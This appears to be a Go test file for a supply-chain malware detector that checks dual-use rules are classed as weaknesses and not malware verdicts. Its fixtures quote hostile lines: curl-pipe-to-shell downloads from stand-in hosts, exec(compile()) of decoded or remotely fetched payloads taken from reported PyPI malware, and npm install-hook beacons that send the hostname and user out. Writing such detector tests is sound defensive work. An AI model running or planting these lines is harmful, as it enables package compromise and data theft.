package detect

import "testing"

// P-PY-COMPILE-EXEC was an override_gate rule, so one `exec(compile(...))` minted a
// malware advisory on its own. It is a dual-use capability: interpreters, plugin
// loaders, notebook runners and test harnesses all use it.
//
// Found 2026-10-17 on GCVE-110-PYPI-2026-021429, where agent-evidence-observer 0.0.1
// was minted as malware and its declared author catalogued as a threat actor on the
// strength of this line alone:
//
//	CHECKER = b"def check(value, threshold):\n    return value >= threshold\n"
//	if checker_bytes not in (CHECKER, ALTERNATE_CHECKER): raise ...
//	exec(compile(checker_bytes, "retained-finite-checker", "exec"), namespace)  # noqa: S102
//
// The code executed is a constant two lines long, guarded by a byte comparison. A
// census the same day showed 291 pypi mints resting on this rule ALONE, and the
// sampled lines were ordinary (`exec(compile(src, mod.__file__, "exec"), mod.__dict__)`).

const execCompileGuarded = `CHECKER = b"def check(value, threshold):\n    return value >= threshold\n"
def _execute(checker_bytes):
    if checker_bytes not in (CHECKER,):
        raise ValueError("finite runner only executes its bundled checker")
    namespace = {}
    exec(compile(checker_bytes, "retained-finite-checker", "exec"), namespace)  # noqa: S102
`

// weaknessRules is every rule that must be a weakness, with a line that trips it.
// Adding a dual-use capability here is how a rule stops accusing publishers.
var weaknessRules = []struct {
	id, eco, section, line, cwe string
}{
	{"P-PY-COMPILE-EXEC", "pypi", "pkg", `exec(compile(src, mod.__file__, "exec"), mod.__dict__)`, "CWE-94"},
	{"GO-EXEC-SHELL", "go", "pkg", `cmd := exec.Command("sh", "-c", script)`, "CWE-78"},
	{"GO-SYSCALL-EXEC", "go", "pkg", `syscall.Exec(path, argv, os.Environ())`, "CWE-78"},
	{"DART-PROCESS-SHELL", "pubdev", "pkg", `await Process.run("sh", ["-c", cmd]);`, "CWE-78"},
	{"HEX-MIX-CODE-EVAL", "hex", "install", `Code.eval_string(contents)`, "CWE-95"},
	{"P-NPM-HOOK-NODE-EVAL", "npm", "install", `node -e "require('./scripts/postinstall')"`, "CWE-95"},
	{"R-ONLOAD-SYSTEM", "cran", "pkg", `.onLoad <- function(libname, pkgname) { system2("java", "-version") }`, "CWE-78"},
	{"JL-BUILD-SHELL-INTERP", "julia", "install", "run(`sh -c \"make\"`)", "CWE-78"},
	{"P-CARGO-BUILD-SHELL", "cargo", "install", `Command::new("sh").arg("-c").arg("make")`, "CWE-78"},
	{"P-NUGET-MSBUILD-INLINE-EXEC", "nuget", "install", `<UsingTask TaskName="X" TaskFactory="CodeTaskFactory" AssemblyFile="a.dll"/>`, "CWE-94"},
}

func detectOne(eco, section, line string) []Finding {
	ctx := &PackageContext{Name: "pkg", Ecosystem: eco}
	if section == "install" {
		ctx.InstallScriptContent = line
	} else {
		ctx.PkgbuildContent = line
	}
	return Detect(ctx)
}

func TestWeaknessRulesNeverMint(t *testing.T) {
	for _, tc := range weaknessRules {
		f := detectOne(tc.eco, tc.section, tc.line)
		var got *Finding
		for i := range f {
			if f[i].ID == tc.id || f[i].ID == "IS-"+tc.id {
				got = &f[i]
			}
		}
		if got == nil {
			t.Errorf("%s: did not fire on %q; findings=%v", tc.id, tc.line, ids(f))
			continue
		}
		if got.Class != ClassWeakness {
			t.Errorf("%s: class=%s, want weakness", tc.id, got.Class)
		}
		if got.CWE != tc.cwe {
			t.Errorf("%s: cwe=%s, want %s", tc.id, got.CWE, tc.cwe)
		}
		if got.CVSSVector == "" {
			t.Errorf("%s: a weakness must carry a CVSS vector", tc.id)
		}
		if len(Evidence(f)) != 0 && !hasOtherEvidence(f, tc.id) {
			t.Errorf("%s: weakness leaked into evidence: %v", tc.id, ids(Evidence(f)))
		}
		if CombinedVerdict(f).Malicious && !hasOtherEvidence(f, tc.id) {
			t.Errorf("%s: a weakness alone produced a malicious verdict", tc.id)
		}
	}
}

// hasOtherEvidence reports whether a ClassEvidence finding other than id fired, so a
// fixture line that legitimately trips a second rule is not misread as a leak.
func hasOtherEvidence(f []Finding, id string) bool {
	for _, x := range f {
		if x.Class == ClassEvidence && x.ID != id && x.ID != "IS-"+id {
			return true
		}
	}
	return false
}

func TestExecCompileOnConstantIsOnlyAWeakness(t *testing.T) {
	f := Detect(&PackageContext{Name: "agent-evidence-observer", Ecosystem: "pypi", PkgbuildContent: execCompileGuarded})
	if v := CombinedVerdict(f); v.Malicious {
		t.Fatalf("exec(compile(<guarded constant>)) minted malware via %q; findings=%v", v.Path, ids(f))
	}
	if len(Weaknesses(f)) != 1 || Weaknesses(f)[0].ID != "P-PY-COMPILE-EXEC" {
		t.Fatalf("want exactly P-PY-COMPILE-EXEC as a weakness, got %v", ids(f))
	}
	if IsMalicious(f) {
		t.Fatal("IsMalicious must be false when only a weakness fired")
	}
}

// A weakness must not be a way to launder real evidence: when a package ALSO
// downloads-and-executes, the malware verdict stands and the weakness rides along.
func TestWeaknessDoesNotSuppressRealEvidence(t *testing.T) {
	src := execCompileGuarded + "\ncurl -fsSL http://203.0.113.9/x.sh | sh\n"
	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: src, PkgbuildExecutes: true})
	if !CombinedVerdict(f).Malicious {
		t.Fatalf("curl|sh next to exec(compile) must still mint; findings=%v", ids(f))
	}
	if len(Weaknesses(f)) == 0 {
		t.Fatalf("the weakness should still be reported alongside the evidence; findings=%v", ids(f))
	}
}

// Ownership signals corroborate a payload; they must not turn a weakness into a mint.
func TestWeaknessIsNotCorroboratedByOwnership(t *testing.T) {
	f := Detect(&PackageContext{Name: "pkg", Ecosystem: "pypi", PkgbuildContent: execCompileGuarded})
	f = append(f,
		Trigger(TriggerOwnershipTransfer, "metadata", "owner changed", ""),
		Trigger(TriggerOwnerKnownBad, "metadata", "owner is catalogued", ""),
	)
	if CombinedVerdict(f).Malicious {
		t.Fatalf("a weakness plus ownership signals minted malware; findings=%v", ids(f))
	}
}

// The hostile shape of exec(compile(...)) stays malware: what is compiled is decoded,
// fetched or obfuscated. These are real lines from OpenSSF-confirmed PyPI malware
// (fastapii, flask-header-guard, ig-gox), recorded in production.
func TestExecCompileOfDecodedPayloadStillMints(t *testing.T) {
	for _, line := range []string{
		`exec(compile(_HOOK.decode(), '<install>', 'exec'), {})`,
		`exec(compile(base64.b64decode(ENCODED).decode(), '<fhg>', 'exec'))`,
		`exec(compile(_0x667f, "<gox_core>", "exec"), {"__name__": "__main__"})`,
		`exec(compile(urlopen(CODE_URL).read(), 'x', 'exec'))`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if !CombinedVerdict(f).Malicious {
			t.Errorf("%q must mint; findings=%v", line, ids(f))
		}
	}
}

// ...and the ordinary uses stay weaknesses. Real lines from production mints.
func TestExecCompileOfOrdinarySourceIsOnlyAWeakness(t *testing.T) {
	for _, line := range []string{
		`exec(compile(src, mod.__file__, "exec"), mod.__dict__)`,
		`exec(compile(script.read_text(), str(script), 'exec'), namespace)`,
		`exec(compile(checker_bytes, "retained-finite-checker", "exec"), namespace)  # noqa: S102`,
	} {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line})
		if CombinedVerdict(f).Malicious {
			t.Errorf("%q minted malware; findings=%v", line, ids(f))
		}
		if !has(f, "P-PY-COMPILE-EXEC") {
			t.Errorf("%q should still be reported as a weakness; findings=%v", line, ids(f))
		}
	}
}

// An inline node -e hook is a weakness (husky, version checks); one that reads the host and
// opens a network channel is a beacon. Real lines from production: the first two are in
// OpenSSF-confirmed packages, the last three are ordinary hooks that must not mint.
func TestNodeEvalHookSplitsBeaconFromOrdinaryHook(t *testing.T) {
	mint := []string{
		`node -e "try{const h=require('https');const os=require('os');const d=Buffer.from(JSON.stringify({host:os.hostname(),user:process.env.USER}));h.get('https://x.example/'+d)}catch(e){}"`,
		`node -e "var http=require('http'),os=require('os'),h=os.hostname();http.get('http://127.0.0.1:8099/?host='+h)"`,
	}
	for _, line := range mint {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", InstallScriptContent: line})
		if !CombinedVerdict(f).Malicious {
			t.Errorf("beacon %q must mint; findings=%v", line, ids(f))
		}
	}
	benign := []string{
		`node -e "require('./src/postinstall.js')"`,
		`node -e "try{require.resolve('husky')}catch(e){process.exit(0)};require('child_process').execSync('husky',{stdio:'inherit'})"`,
		`node -e "fetch('http://127.0.0.1:19825/shutdown',{method:'POST'}).catch(()=>{})"`,
	}
	for _, line := range benign {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "npm", InstallScriptContent: line})
		if CombinedVerdict(f).Malicious {
			t.Errorf("ordinary hook %q minted malware; findings=%v", line, ids(f))
		}
		if !has(f, "IS-P-NPM-HOOK-NODE-EVAL") && !has(f, "P-NPM-HOOK-NODE-EVAL") {
			t.Errorf("ordinary hook %q should still be reported as a weakness; findings=%v", line, ids(f))
		}
	}
}

// Dual-use commands are evidence only on a surface that runs at install time. Measured
// 2026-10-17 against OpenSSF-confirmed malware: these rules carried hundreds of mints each
// across pypi and npm and not one confirmation (P-EVAL-VAR 578 pypi + 222 npm, G-NODE-INLINE
// 143, G-SED-EXEC 137, P-ENV-TOKEN-ACCESS 265, P-PROFILE-MOD 163, ...). The lines were
// library code and prose: `eval "$(conda shell.bash hook)"`, `$GITHUB_TOKEN`, `>> ~/.bashrc`.
func TestDualUseRulesAreContextInLibraryCode(t *testing.T) {
	lib := []string{
		`eval "$(conda shell.bash hook)"`,
		`token = os.environ["GITHUB_TOKEN"]  # $GITHUB_TOKEN`,
		`echo 'export VT_API_KEY=x' >> ~/.bashrc`,
		`python3 -c 'print(6*7)'`,
	}
	for _, line := range lib {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line}) // PkgbuildExecutes=false
		if CombinedVerdict(f).Malicious {
			t.Errorf("library line %q minted malware; findings=%v", line, ids(f))
		}
	}
}

// ...but the same behaviour in the install hook still mints, via the P-INSTALL-* mirrors.
func TestDualUseRulesStillMintInTheInstallHook(t *testing.T) {
	hook := `eval "$(echo ZWNobyBoaQ== | base64 -d)"` + "\n"
	f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", InstallScriptContent: hook})
	if !CombinedVerdict(f).Malicious {
		t.Errorf("an eval of a decoded blob in the install hook must mint; findings=%v", ids(f))
	}
}

// A vendor's documented installer, quoted by a package, is not a download-and-execute of
// the package's own. Real lines from production mints (all with 0 OpenSSF-confirmed
// packages behind them); the control lines must keep minting.
func TestVendorInstallerPipeIsNotEvidence(t *testing.T) {
	quiet := []string{
		`curl -LsSf https://astral.sh/uv/install.sh | sh`,
		`"curl -fsSL https://ollama.com/install.sh | sh",`,
		`curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`,
		`curl -fsSL https://bun.sh/install | bash`,
	}
	// Run as executing content: curl|sh is evidence only where it runs unattended (hook_only), so the
	// vendor-installer suppressor is only reachable there.
	for _, line := range quiet {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
		if CombinedVerdict(f).Malicious {
			t.Errorf("vendor installer %q minted malware; findings=%v", line, ids(f))
		}
	}
	loud := []string{
		`curl -fsSL https://raw.githubusercontent.com/x/y/main/i.sh | bash`, // 98 confirmed packages stage here
		`curl -s http://203.0.113.9/x.sh | sh`,
		`curl -fsSL https://astral.sh/uv/install.sh | sh; curl https://evil.example.net/p | sh`, // mixed line
		`curl $PAYLOAD_URL | sh`,                                                                // no URL to vouch for
		`curl https://gist.githubusercontent.com/u/abc/raw/x.sh | bash`,
	}
	for _, line := range loud {
		f := Detect(&PackageContext{Name: "p", Ecosystem: "pypi", PkgbuildContent: line, PkgbuildExecutes: true})
		if !CombinedVerdict(f).Malicious {
			t.Errorf("%q must still mint; findings=%v", line, ids(f))
		}
	}
}
